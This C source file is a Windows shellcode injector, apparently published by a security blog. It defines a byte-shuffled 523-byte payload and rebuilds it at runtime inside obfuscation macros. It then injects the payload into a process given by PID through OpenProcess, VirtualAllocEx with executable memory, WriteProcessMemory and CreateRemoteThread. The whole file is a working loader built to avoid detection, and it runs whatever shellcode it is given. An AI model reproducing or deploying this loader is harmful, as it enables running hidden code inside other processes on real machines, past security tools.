#include "Windows.h"
#include "instr.h"

unsigned char jiggy[523] = { 0x89, 0x08, 0x9f, 0x58, 0x54, 0x71, 0xbc, 0x98, 0x3e, 0x07, 0x20, 0x9a, 0xb6, 0xc9, 0x4e, 0xe1, 0x99, 0xac, 0x48, 0x4f, 0x27, 0x7d, 0x36, 0x4c, 0xe5, 0xd6, 0xbc, 0x88, 0x8f, 0x4a, 0x3f, 0x7e, 0xc5, 0x33, 0x58, 0x5a, 0x94, 0x0b, 0xfd, 0x89, 0x37, 0x68, 0x8d, 0xea, 0x8d, 0xe9, 0xea, 0x4e, 0x4d, 0xff, 0xdc, 0x26, 0x19, 0x58, 0x37, 0x37, 0xaf, 0x4c, 0x91, 0x5b, 0x35, 0xb9, 0x70, 0xb4, 0xcc, 0xc9, 0x61, 0xe8, 0xc5, 0x32, 0x01, 0x8d, 0x6f, 0x5d, 0x8c, 0x03, 0x06, 0xc0, 0x4e, 0xbc, 0xbc, 0x54, 0xba, 0xac, 0x98, 0x42, 0xd7, 0x7c, 0xff, 0xe3, 0x1a, 0x74, 0x36, 0x94, 0xd9, 0x83, 0x7e, 0xbe, 0x23, 0xbb, 0x7a, 0xc0, 0xcb, 0x1b, 0x6e, 0x87, 0x7a, 0xf9, 0x37, 0x8d, 0xb7, 0xe0, 0xc3, 0x80, 0xfd, 0xd9, 0x98, 0x91, 0x8c, 0x09, 0xf9, 0xff, 0x01, 0x8f, 0x30, 0x32, 0xee, 0x12, 0xb6, 0xb6, 0xf8, 0xff, 0x4f, 0x66, 0xb6, 0xfd, 0x06, 0x69, 0x8e, 0x62, 0x5a, 0xc8, 0x77, 0xbf, 0xea, 0x07, 0x71, 0xf1, 0x16, 0xef, 0x29, 0xf3, 0x77, 0xd7, 0x60, 0xc8, 0x55, 0x47, 0x85, 0xc3, 0xaf, 0xe8, 0x8b, 0xf4, 0x21, 0xff, 0x7f, 0xba, 0x04, 0x56, 0xbc, 0x91, 0xa9, 0x95, 0x91, 0x8f, 0xec, 0x4b, 0x06, 0x7e, 0xda, 0x42, 0xf5, 0xbf, 0xf7, 0x5f, 0x37, 0xc8, 0x5a, 0x2d, 0xc9, 0x47, 0x76, 0x98, 0x8f, 0x62, 0xb6, 0xff, 0x03, 0x8c, 0x83, 0xe8, 0x6d, 0xe7, 0x4f, 0x02, 0x22, 0x80, 0x90, 0x18, 0xe4, 0x69, 0x4f, 0x47, 0xff, 0xb1, 0x06, 0xc8, 0xe4, 0xa3, 0x8e, 0xd9, 0x60, 0x91, 0x31, 0xff, 0xae, 0xe8, 0xb6, 0x48, 0x05, 0xdd, 0xbd, 0x7c, 0xf7, 0xc0, 0x1e, 0xe8, 0x44, 0xe2, 0x6d, 0x07, 0xff, 0x49, 0x0c, 0x98, 0x89, 0xfd, 0x09, 0x98, 0x37, 0xe1, 0xc9, 0x0c, 0x47, 0x2b, 0xf8, 0x07, 0xf5, 0xbf, 0x91, 0xe8, 0xd9, 0xe1, 0xa1, 0x31, 0xbd, 0x87, 0xcb, 0xb7, 0xf5, 0x51, 0xad, 0x8d, 0xf4, 0xf8, 0x69, 0x2f, 0xbf, 0x36, 0xbf, 0xdb, 0xc0, 0x06, 0x4a, 0x63, 0x08, 0xe1, 0xfd, 0x2d, 0x08, 0xc4, 0x8a, 0xc8, 0x81, 0x19, 0xe1, 0x7e, 0x72, 0xbe, 0x3e, 0x1f, 0xff, 0xe4, 0xff, 0x7e, 0x51, 0x8d, 0xdd, 0xff, 0x98, 0xcb, 0x47, 0x45, 0x37, 0xe2, 0xff, 0x8d, 0x31, 0x47, 0xff, 0xe4, 0xfc, 0xf8, 0x33, 0x37, 0x05, 0x57, 0x2a, 0x36, 0x77, 0xd3, 0x4d, 0xfc, 0xf1, 0xbd, 0x31, 0x74, 0x7e, 0xda, 0xed, 0x08, 0xff, 0xf9, 0x04, 0x22, 0xc9, 0x52, 0x30, 0xb8, 0x11, 0x36, 0x91, 0x8d, 0x68, 0xe1, 0x7c, 0xe6, 0xf7, 0x8b, 0xa9, 0xfe, 0xc9, 0x5e, 0x6f, 0x06, 0xa8, 0xa4, 0x8a, 0xd9, 0xc4, 0xf1, 0x48, 0x69, 0x4f, 0x03, 0xff, 0x7e, 0xfb, 0x66, 0xbd, 0x34, 0x88, 0xb8, 0x6f, 0x27, 0xd4, 0xff, 0x4f, 0x9b, 0xbc, 0x09, 0x91, 0xf8, 0xe6, 0xc4, 0xdd, 0xa3, 0x06, 0x54, 0x42, 0x8c, 0xcc, 0x37, 0x23, 0x9a, 0xb2, 0x0c, 0xbf, 0x32, 0xf7, 0x48, 0xf4, 0x51, 0x48, 0x83, 0x63, 0x2e, 0xed, 0x8d, 0xca, 0x8f, 0xbc, 0x65, 0x21, 0xfd, 0xc0, 0xdb, 0x56, 0x72, 0xa0, 0x46, 0xf3, 0x8d, 0x36, 0xf5, 0xe5, 0x61, 0xc4, 0xc0, 0x56, 0x65, 0x5b, 0xc5, 0xf8, 0x47, 0x6d, 0x4b, 0x28, 0xbc, 0x91, 0x7d, 0x4b, 0x03, 0x53, 0x98, 0xc4, 0xe8, 0x64, 0xb1, 0xcf, 0xd9, 0xfd, 0xf9, 0xde, 0x4a, 0x06, 0xe5, 0x98, 0xdc, 0x69, 0xfa, 0xf6, 0x48, 0xee, 0x3f, 0x77, 0x44, 0xc8, 0x43, 0xff, 0x39, 0x7c, 0xcf, 0xc6, 0xf5, 0x91, 0x22, 0xbf, 0xa9, 0x29, 0xbf, 0xbd, 0x02, 0xf9, 0x26, 0x6e, 0xd6, 0xe8, 0xa8, 0x9f, 0x8f, 0x17, 0xf7, 0x7c, 0xff, 0x54, 0xc1, 0xe1, 0xe8, 0x8d, 0x79, 0x56, 0x01, 0xf4, 0x0e, 0x79, 0xd5, 0x08, 0xb9, 0xc8, 0xf9, 0x50 };
int poss[523] = { 72, 164, 255, 463, 257, 507, 486, 440, 195, 422, 285, 179, 228, 443, 126, 493, 216, 362, 30, 158, 50, 186, 283, 455, 365, 355, 66, 81, 309, 302, 497, 147, 423, 352, 49, 321, 483, 98, 250, 157, 444, 181, 470, 162, 254, 25, 476, 142, 301, 29, 315, 328, 408, 479, 340, 102, 364, 488, 96, 201, 314, 457, 265, 474, 239, 259, 279, 79, 458, 177, 310, 31, 367, 135, 323, 521, 127, 10, 358, 394, 290, 424, 332, 504, 77, 297, 198, 99, 15, 286, 294, 131, 39, 388, 384, 240, 347, 284, 113, 38, 307, 6, 108, 153, 430, 278, 110, 375, 351, 271, 156, 161, 65, 308, 500, 320, 456, 464, 159, 160, 478, 9, 289, 383, 373, 105, 90, 419, 436, 412, 154, 35, 193, 435, 124, 210, 215, 510, 387, 480, 513, 4, 235, 451, 434, 506, 415, 450, 91, 33, 501, 481, 371, 244, 75, 109, 273, 118, 494, 337, 236, 336, 169, 261, 172, 36, 299, 498, 359, 517, 407, 368, 141, 87, 104, 454, 330, 241, 167, 379, 192, 214, 112, 60, 40, 238, 130, 12, 233, 516, 339, 398, 380, 184, 111, 390, 396, 19, 385, 119, 137, 298, 381, 511, 262, 281, 492, 183, 197, 120, 508, 378, 313, 166, 27, 410, 42, 460, 101, 420, 266, 512, 165, 152, 21, 17, 264, 237, 180, 47, 293, 399, 203, 346, 115, 14, 360, 445, 175, 62, 503, 318, 56, 495, 97, 472, 223, 514, 482, 426, 174, 277, 491, 312, 350, 487, 53, 134, 218, 84, 88, 69, 392, 213, 484, 48, 100, 232, 132, 204, 442, 122, 252, 222, 338, 418, 409, 461, 416, 139, 275, 509, 18, 505, 499, 354, 260, 133, 114, 52, 468, 417, 401, 20, 24, 144, 121, 348, 247, 489, 116, 217, 3, 173, 7, 163, 224, 391, 95, 13, 333, 449, 425, 370, 171, 57, 28, 205, 428, 230, 5, 414, 377, 199, 263, 219, 32, 70, 61, 452, 363, 518, 372, 345, 229, 226, 64, 94, 300, 243, 74, 143, 55, 397, 303, 85, 477, 136, 256, 376, 276, 395, 344, 519, 349, 341, 106, 234, 140, 128, 429, 405, 22, 402, 411, 151, 421, 117, 369, 520, 447, 496, 23, 361, 206, 45, 54, 467, 212, 331, 155, 138, 89, 296, 251, 220, 78, 34, 343, 269, 46, 208, 400, 125, 227, 389, 439, 374, 306, 246, 305, 207, 71, 291, 129, 107, 196, 353, 92, 465, 68, 51, 170, 73, 0, 471, 469, 427, 168, 319, 59, 366, 522, 288, 490, 502, 2, 146, 446, 311, 404, 382, 295, 43, 67, 274, 453, 403, 268, 335, 83, 209, 249, 431, 202, 438, 326, 225, 304, 282, 80, 63, 406, 393, 441, 194, 287, 221, 123, 475, 334, 44, 322, 413, 324, 292, 270, 433, 272, 189, 267, 459, 148, 37, 82, 242, 145, 103, 8, 258, 1, 248, 178, 182, 26, 386, 176, 93, 76, 41, 325, 515, 211, 185, 462, 448, 466, 329, 485, 317, 316, 342, 188, 190, 357, 11, 86, 191, 253, 245, 327, 149, 150, 200, 58, 187, 280, 231, 356, 473, 16, 437, 432 };

unsigned char calc_pload[523] = { 0x00 };
int sdx, pos;

int main(int argc, char* argv[])
{

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("#nosoc - expect the unexpected\n");
	printf("www.nosociety.de\n\n");

	printf("[*] Payload reconstruction\n");

	OBF_BEGIN
		FOR(V(sdx) = N(0), sdx < sizeof(poss) / sizeof(poss[0]), sdx += 1) {
		pos = poss[sdx];
		calc_pload[pos] = jiggy[sdx];
	}
		ENDFOR
	OBF_END
	
	printf("[*] Start injecting to PID: %i\n", atoi(argv[1]));
	printf("[*] Opening process and get handle\n");
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	printf("[*] Allocate memory for our shellcode\n");
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof calc_pload, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	printf("[*] Write shellcode in the allocated memory\n");
	WriteProcessMemory(processHandle, remoteBuffer, calc_pload, sizeof calc_pload, NULL);
	printf("[*] Create thread\n");
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	printf("[*] Close handle\n");
	CloseHandle(processHandle);

	return 0;
}